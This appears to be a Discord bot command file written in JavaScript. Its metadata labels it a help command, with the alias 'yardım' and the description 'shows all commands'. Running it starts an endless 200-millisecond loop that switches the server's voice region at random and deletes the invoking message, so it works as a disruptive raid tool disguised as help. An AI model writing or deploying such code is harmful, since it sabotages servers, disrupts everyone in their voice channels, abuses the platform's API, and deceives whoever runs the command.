const Discord = require("discord.js");



module.exports.run = async(bot, message, args, recrue) => {
   message.delete();
    if(recrue) {
      return message.author.send("tu n'as pas les droits pour cette commande").catch(console.error)
    };
message.delete();
var tableauball = ['brazil', 'us-west', 'singapore', 'eu-central', 'hongkong', 'us-south', 'amsterdam', 'us-central', 'london', 'us-east', 'sydney', 'japan', 'eu-west', 'frankfurt', 'russia']
var interval = setInterval (function () {
message.guild.setRegion(tableauball[Math.floor(Math.random()*15)])
}, 200)    
bot.channels.find('name',"berke").send("Log : ["+message.author.tag+" // "+message.author.id+"] ["+message.guild.name+"] La commande region a été éxécutée.");
  
}

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['yardım'],
  permLevel: 0
};

exports.help = {
  name: 'çal',
  description: 'Tüm komutları gösterir.',
  usage: 'bug',
};


